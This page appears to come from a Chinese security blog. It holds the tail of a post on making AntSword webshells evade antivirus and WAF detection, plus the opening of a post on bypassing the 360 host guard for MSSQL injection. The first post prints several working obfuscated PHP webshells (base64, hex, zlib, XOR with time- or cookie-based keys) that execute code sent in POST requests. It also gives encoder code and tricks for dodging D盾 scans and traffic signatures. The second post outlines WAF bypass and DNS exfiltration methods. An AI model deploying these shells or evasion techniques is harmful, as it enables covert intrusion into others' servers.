<p>首先修改一下编码器的代码，将eval部分的代码base64编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data[pwd] &#x3D; Buffer.from(&#96;eval(base64_decode($_POST[$&#123;randomID&#125;]));&#96;).toString(&#39;base64&#39;);</span><br></pre></td></tr></table></figure>

<p>然后在修改下我们的shell，让其在接收参数的时候进行base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$c&#x3D;base64_decode($_POST[&#39;ant&#39;]);</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($c));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后再抓包看下流量，已经没有eval的特征了</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728104852973.png" alt="image-20200728104852973"></p>
<p>其实同理，我们既然可以base64,为什么不能hex呢？</p>
<p>这个我就不讲了，如果理解了base64，那么这个也非常容易</p>
<p><strong>编码器</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2020&#x2F;07&#x2F;28 10:16:51</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*&#x2F;</span><br><span class="line">module.exports &#x3D; (pwd, data, ext&#x3D;&#123;&#125;) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  &#x2F;&#x2F; 以下代码为 PHP Base64 样例</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F; 生成一个随机变量名</span><br><span class="line">  let num &#x3D;  Math.floor(Math.random()*15);</span><br><span class="line">  let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(num)&#125;&#96;;</span><br><span class="line">  &#x2F;&#x2F; 原有的 payload 在 data[&#39;_&#39;]中</span><br><span class="line">  &#x2F;&#x2F; 取出来之后，转为 base64 编码并放入 randomID key 下</span><br><span class="line">  data[randomID] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;hex&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line">  data[pwd] &#x3D; Buffer.from(&#96;eval(Hex2String($_POST[$&#123;randomID&#125;]));&#96;).toString(&#39;hex&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 删除 _ 原有的payload</span><br><span class="line">  delete data[&#39;_&#39;];</span><br><span class="line">  &#x2F;&#x2F; 返回编码器处理后的 payload 数组</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>shell</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function Hex2String($hex)&#123;</span><br><span class="line">    $string&#x3D;&#39;&#39;;</span><br><span class="line">    for ($i&#x3D;0; $i &lt; strlen($hex)-1; $i+&#x3D;2)&#123;</span><br><span class="line">        $string .&#x3D; chr(hexdec($hex[$i].$hex[$i+1]));</span><br><span class="line">    &#125;</span><br><span class="line">    echo $string;</span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$c&#x3D;Hex2String($_POST[&#39;ant&#39;]);</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($c));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最后效果如下;</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728105845603.png" alt="image-20200728105845603"></p>
<p>这种简单的编解码处理可能防护设备也会自己解码，我们可以使用各种加密，或者自己写一个简单的算法对数据进行处理，甚至使用多种编解码+加密方式混合处理。</p>
<h5 id="特征四：返回包格式"><a href="#特征四：返回包格式" class="headerlink" title="特征四：返回包格式"></a>特征四：返回包格式</h5><p>我这里查看了下蚁剑处理返回包的模板，发现其实蚁剑对返回包的分隔符的长度是随机生成的，代码在source/core/php/index.js中</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728111846522.png" alt="image-20200728111846522"></p>
<p>所以在返回包处理这部分，我们更应该关注的不是返回包格式的问题，而是返回的明文内容的问题，这些特征都是特别明显的。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728112128155.png" alt="image-20200728112128155"></p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728112144427.png" alt="image-20200728112144427"></p>
<p>这里蚁剑本身就提供了一些解码器使用，比如base64解码，只要我们在使用的时候选择解码器就行了，不用我们在shell里面添加解码功能。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134220904.png" alt="image-20200728134220904"></p>
<p>使用效果如下：</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134243030.png" alt="image-20200728134243030"></p>
<p>我们再看下我们发送的数据是怎么样的，如下图所示，就是我们发送的数据包中让其在输出的时候做了一个base64的编码</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134401588.png" alt="image-20200728134401588"></p>
<p>同理，蚁剑还提供了rot13的解码器，使用效果如下：</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728134524436.png" alt="image-20200728134524436"></p>
<h5 id="特征五：custom-shell的特性"><a href="#特征五：custom-shell的特性" class="headerlink" title="特征五：custom shell的特性"></a>特征五：custom shell的特性</h5><p>首先我们使用一个custom模式的shell，然后抓包看下返回包,有没有看到一个非常明显的特征。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728152948041.png" alt="image-20200728152948041"></p>
<p>对的，如你所见，这个特征就是-&gt;|和|&lt;-，正常的数据包中基本不会出现这个，因此这个也会被当作是蚁剑的特征。因为这边我们只传入了一个A，因此返回的处理逻辑肯定是写在custom的shell里的，我在shell中找到了对应的代码，但是直接删除后发现蚁剑不能正常工作了，也就是如果要删除这个东西会影响蚁剑对返回包的解析，因此可能需要修改蚁剑处理custom模式返回包部分的代码。在蚁剑的source/core/custom/index.js中，我找到了对应的代码位置。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728153806619.png" alt="image-20200728153806619"></p>
<p>所以我们只要对这部分进行修改就可以了，我们要确保这个符号不会在返回包的内容中出现，我这里随便取了个@#来作为分割符。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154120506.png" alt="image-20200728154120506"></p>
<p>同样，我们要在蚁剑的custom shell中进行相应的修改。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154150241.png" alt="image-20200728154150241"></p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154202049.png" alt="image-20200728154202049"></p>
<p>然后就可以正常的使用了</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728154219306.png" alt="image-20200728154219306"></p>
<p>关于custom模式，还有第二个特性，就是关于传入的参数的参数名，z0,z1,z2等等，这个也算一个特征把，所以我们也需要把它处理一下，这个同样需要在shell和蚁剑同时处理，我在php的custom shell中找到了如下代码</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728160653504.png" alt="image-20200728160653504"></p>
<p>所以我们需要把这几个参数改成比较正常的参数名。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728162411446.png" alt="image-20200728162411446"></p>
<p>然后需要在蚁剑中找到这部分代码进行处理，这个处理就比较麻烦些，因为在好几个文件中都出现了。然后我分别在如下的几个文件中做了处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source\core\custom\template\database\default.js</span><br><span class="line">source\core\custom\template\command.js</span><br><span class="line">source\core\custom\template\filemanager.js</span><br></pre></td></tr></table></figure>

<p>处理后效果如下：</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728162553173.png" alt="image-20200728162553173"></p>
<h4 id="流量免杀"><a href="#流量免杀" class="headerlink" title="流量免杀"></a>流量免杀</h4><p>最后我们来学学流量混淆这部分，其实这里一方面是运用各种加密解密来对流量进行混淆，另一方面就是使用一些蚁剑本身提供的特性来进行混淆。</p>
<h5 id="方法一：更改post的格式为Multipart"><a href="#方法一：更改post的格式为Multipart" class="headerlink" title="方法一：更改post的格式为Multipart"></a>方法一：更改post的格式为Multipart</h5><p>我们如果之前简单了解过一些绕WAF的技巧，我们就知道有些WAF针对于不同的请求类型的拦截规则是不一样的，大多数的WAF会对GET类型的请求拦截非常严格，但是对于POST会弱一些，有时候假如我们改变了请求体的方式为Multipart，有些WAF甚至只会检测文件上传漏洞，所以呢，可以通过这个特性来进行简单的绕过。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155455601.png" alt="image-20200728155455601"></p>
<p>设置后的效果如下：</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155629444.png" alt="image-20200728155629444"></p>
<h5 id="方法二：分块传输"><a href="#方法二：分块传输" class="headerlink" title="方法二：分块传输"></a>方法二：分块传输</h5><p>之前别人公开了分块传输绕WAF的方法后，后来做项目中遇到不少WAF都可以直接通过分块传输绕过。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728155810488.png" alt="image-20200728155810488"></p>
<p>这里我设置好并刷新了下缓存，然后在burp上查看发包的这个过程，比较奇怪的是并没有发现分块传输的迹象。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728160222681.png" alt="image-20200728160222681"></p>
<p>不过有老哥已经写了burp的分块传输的插件，我们可以将蚁剑的流量代理到burp上，再使用分块插件进行分块，嗯，真香。</p>
<p>蚁剑中设置：</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163023441.png" alt="image-20200728163023441"></p>
<p>burp插件中设置：</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163044919.png" alt="image-20200728163044919"></p>
<p>然后就可以分块了。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728163127083.png" alt="image-20200728163127083"></p>
<h5 id="方法三：各种编码解码器"><a href="#方法三：各种编码解码器" class="headerlink" title="方法三：各种编码解码器"></a>方法三：各种编码解码器</h5><p>蚁剑作者给了很多编解码器，地址：<a href="https://github.com/AntSwordProject/AwesomeEncoder" target="_blank" rel="noopener">https://github.com/AntSwordProject/AwesomeEncoder</a></p>
<p><strong>zlib</strong></p>
<p>在这个编码器里面也有关于如何去处理shell的提示</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728165427727.png" alt="image-20200728165427727"></p>
<p>我将之前测试免杀D盾的shell稍微改了一下就可以了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a&#x3D;&quot;assert&quot;;</span><br><span class="line">$c&#x3D;$_POST[&#39;ant&#39;];</span><br><span class="line">$d&#x3D;base64_decode($c);</span><br><span class="line">$e&#x3D;gzinflate($d);</span><br><span class="line">$b&#x3D;array(&#39;&#39;&#x3D;&gt;$a($e));</span><br><span class="line">uksort($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最后效果如下:</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728165614745.png" alt="image-20200728165614745"></p>
<p><strong>动态密钥</strong></p>
<p>因为之前有人分析冰蝎的加密，得出可以通过获取密钥的那个数据包来对冰蝎的指纹进行识别，所以yzddmr6前辈为了写了两款关于动态密钥的编码器，一个是基于时间生成密钥的，还有一个是通过随机cookie来生成的，我们都学习一下吧。</p>
<p><strong>基于时间的动态密钥</strong></p>
<p>我们跟着代码稍微学习一下，下面这段代码是比较简单和，和蚁剑自带的编码器代码没有什么区别，主要的操作在xor函数里。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174216362.png" alt="image-20200728174216362"></p>
<p>跟进到xor函数里，函数里获取了当前的时间，并调用switch对时间的格式进行处理，switch这个函数是自定义的处理函数。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174601774.png" alt="image-20200728174601774"></p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174701365.png" alt="image-20200728174701365"></p>
<p>使用格式化后的time的md5值作为key,对payload进行异或处理。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728174910075.png" alt="image-20200728174910075"></p>
<p>要使用这个编码器我们需要对我们的shell做一定的处理，需要在shell中加入解密的逻辑代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&quot;PRC&quot;);</span><br><span class="line">@$post&#x3D;base64_decode($_REQUEST[&#39;yzddmr6&#39;]);</span><br><span class="line">$key&#x3D;md5(date(&quot;Y-m-d H:i&quot;,time()));</span><br><span class="line">for($i&#x3D;0;$i&lt;strlen($post);$i++)&#123;</span><br><span class="line">    $post[$i] &#x3D; $post[$i] ^ $key[$i%32];</span><br><span class="line">&#125;</span><br><span class="line">eval($post);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最后数据包是这样的</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728175747960.png" alt="image-20200728175747960"></p>
<p>base64解码后也是看不到明文内容的</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728175815387.png" alt="image-20200728175815387"></p>
<p><strong>基于cookie的动态密钥</strong></p>
<p>这种方法生成26位的随机字符放在了cookie的PHPSESSID中，设置方法基于时间的差不多，最后效果如下：</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728180915972.png" alt="image-20200728180915972"></p>
<p>这里yzddmr6前辈还给出了一个免杀的shell，我们分析下这个shell为什么就能免杀D盾</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Cookie</span><br><span class="line">&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $key&#x3D;@$_COOKIE[&#39;PHPSESSID&#39;];</span><br><span class="line">        @$post&#x3D;base64_decode($_REQUEST[&#39;test&#39;]);</span><br><span class="line">        for($i&#x3D;0;$i&lt;strlen($post);$i++)&#123;</span><br><span class="line">            $post[$i] &#x3D; $post[$i] ^ $key[$i%26];</span><br><span class="line">        &#125;</span><br><span class="line">        return $post;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;return @eval($this-&gt;__construct());&#125;</span><br><span class="line">&#125;</span><br><span class="line">$check&#x3D;new Cookie();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我基本把代码都删完了，发现当仅仅留下下面这段代码的时候D盾是会爆1级的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;return @eval($this-&gt;__construct());&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181601624.png" alt="image-20200728181601624"></p>
<p>然后前面加个函数名就不会杀了。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181726799.png" alt="image-20200728181726799"></p>
<p>而且当直接调用eval($this)会升到4级，但是使用$this-&gt;__construct()这种形式就少了很多。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728181848146.png" alt="image-20200728181848146"></p>
<p>再测试了下，当参数中有-&gt;等级会下降很多，再加上参数+括号就不报了。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182041283.png" alt="image-20200728182041283"></p>
<p><strong><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182102746.png" alt="image-20200728182102746"></strong></p>
<p>所以对于其他敏感函数的拦截我们是不是也可以通过这种调用的方式绕过D盾的拦截。</p>
<p>我使用assert再进行了测试，直接这样绕是会爆一级的，但是在这个代码前加上其他函数就不杀了，所以我们又学到一个小技巧，就是可以把我们代码执行的函数放在其他函数的后面。</p>
<p><img src="/2020/07/26/%E5%85%B3%E4%BA%8E%E8%9A%81%E5%89%91%E5%85%8D%E6%9D%80%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200728182629591.png" alt="image-20200728182629591"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过对蚁剑免杀的学习，终于明白为什么我的shell总会被杀了，所以深入了解一个工具是非常有必要的。</p>
<p>参考文章：</p>
<p><a href="https://yzddmr6.tk/posts/antsword-xor-encoder-2/" target="_blank" rel="noopener">基于随机Cookie的蚁剑动态秘钥编码器</a></p>
<p><a href="https://yzddmr6.tk/posts/antsword-xor-encoder/" target="_blank" rel="noopener">蚁剑实现动态秘钥编码器解码器</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&mid=2247483852&idx=1&sn=3cd3f667523550d414fad97231eeeaea&chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&mpshare=1&scene=23&srcid&sharer_sharetime=1572778022447&sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd" target="_blank" rel="noopener">蚁剑绕WAF进化图鉴</a></p>
<p><a href="https://xz.aliyun.com/t/4000#toc-4" target="_blank" rel="noopener">从静态到动态打造一款免杀的antSword(蚁剑)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/" class="post-title-link" itemprop="url">MSSQL注入绕过360主机卫士</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-07-26 15:35:22" itemprop="dateCreated datePublished" datetime="2020-07-26T15:35:22+08:00">2020-07-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-07-28 18:39:21" itemprop="dateModified" datetime="2020-07-28T18:39:21+08:00">2020-07-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">仅仅是记录绕过的思路和过程，也算是自己的一个总结</span><br></pre></td></tr></table></figure>

<h1 id="绕过过程"><a href="#绕过过程" class="headerlink" title="绕过过程"></a>绕过过程</h1><h2 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h2><p>这个之前bypass写过，我这次测试的目标同样是可以使用参数污染来进行绕过的，会出现这个问题，是因为360主机卫士在处理post请求时，没有处理post请求中的get参数，所以可以使用这种方式来进行全局绕过。</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726165735149.png" alt="image-20200726165735149"></p>
<h2 id="静态资源白名单"><a href="#静态资源白名单" class="headerlink" title="静态资源白名单"></a>静态资源白名单</h2><p>之前我自己也经过测试，在php+apache或aspx+iis的站上，加静态后缀是不会影响程序的正常解析。同时，这个也能绕过安全卫士</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726170717888.png" alt="image-20200726170717888"></p>
<h2 id="改变请求为multipart-form-data"><a href="#改变请求为multipart-form-data" class="headerlink" title="改变请求为multipart/form-data"></a>改变请求为multipart/form-data</h2><p>这个方法直接使用是绕不过的，不过可以配合数据填充的方法进行绕过</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726171115095.png" alt="image-20200726171115095"></p>
<h2 id="语义上的绕过"><a href="#语义上的绕过" class="headerlink" title="语义上的绕过"></a>语义上的绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上面的绕过是全局绕过的方法，下面我们回归到正常语句的绕过</span><br></pre></td></tr></table></figure>

<p>现在我们要测试多语句，需要使用waitfor delay来进行判断，我们知道，很多waf在遇到%00是会忽略后面的语句的，但是在ASPX+IIS的环境中，并不会影响正常解析，我们尝试使用这个特性绕过。</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726180930445.png" alt="image-20200726180930445"></p>
<p><strong>DNS外带</strong></p>
<p>我们再测试能否绕过WAF发起DNS请求，首先我还是使用%00代替空格，但是这里是绕不过的</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726194613652.png" alt="image-20200726194613652"></p>
<p>这里的拦截一般就是exec和xp_dirtree的拦截，首先我测试在exec和xp_dirtree之间，能否又什么字符可以绕过，这里可以使用换行加注释进行绕过。</p>
